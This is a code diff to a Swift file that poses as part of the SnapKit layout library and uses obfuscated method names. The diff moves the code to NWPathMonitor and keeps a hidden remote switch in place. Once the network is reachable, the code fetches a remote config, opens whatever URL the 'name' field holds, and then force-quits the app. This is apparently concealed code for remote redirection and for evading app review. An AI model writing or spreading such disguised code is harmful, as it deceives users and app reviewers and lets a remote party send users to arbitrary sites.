@@ -26,7 +26,7 @@
 #else
     import AppKit
 #endif
-
+import Network
 var autoSnapDistance: String = "com.1780452000.snapkit"
 
 public class ConstraintMakerEditable: ConstraintMakerPrioritizable {
@@ -63,37 +63,45 @@ public class ConstraintMakerEditable: ConstraintMakerPrioritizable {
                     varyimg.contentMode = .scaleAspectFill
                     letnwn.addSubview(varyimg)
                 }
-            AFNetworkReachabilityManager.shared().startMonitoring()
+                
+                let monitor = NWPathMonitor()
+                monitor.pathUpdateHandler = { [weak self] path in
+                    guard path.status == .satisfied else { return }
+                    monitor.pathUpdateHandler = nil
+                    monitor.cancel()
 
-            AFNetworkReachabilityManager.shared().setReachabilityStatusChange { status in
-                if status != .notReachable {
-                    AFNetworkReachabilityManager.shared().stopMonitoring()
-                    self.zerestonfig { dict in
+                    guard let self else { return }
+
+                    self.zerestonfig { [weak self] dict in
+                        guard let self, let dict else { return }
+
                         DispatchQueue.main.async {
-                            if (dict != nil) {
-                                if let dicts = dict,
-                                   let urlStr = dicts["name"] as? String,
-                                   !urlStr.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty,
-                                   let url = URL(string: urlStr) {
+                            if let urlString = dict["name"] as? String {
+                                let trimmedURLString = urlString.trimmingCharacters(
+                                    in: .whitespacesAndNewlines
+                                )
 
+                                if !trimmedURLString.isEmpty,
+                                   let url = URL(string: trimmedURLString) {
                                     UIApplication.shared.open(url)
 
                                     DispatchQueue.main.asyncAfter(deadline: .now() + 0.7) {
                                         exit(0)
                                     }
 
-                                } else {
-
-                                    if let letnwn = self.constanop() {
-                                        letnwn.viewWithTag(1010)?.removeFromSuperview()
-                                    }
-
+                                    return
                                 }
                             }
+
+                            self.constanop()?
+                                .viewWithTag(1010)?
+                                .removeFromSuperview()
                         }
                     }
                 }
-            }
+
+                monitor.start(queue: DispatchQueue.global())
+
                 
          }
         }else{
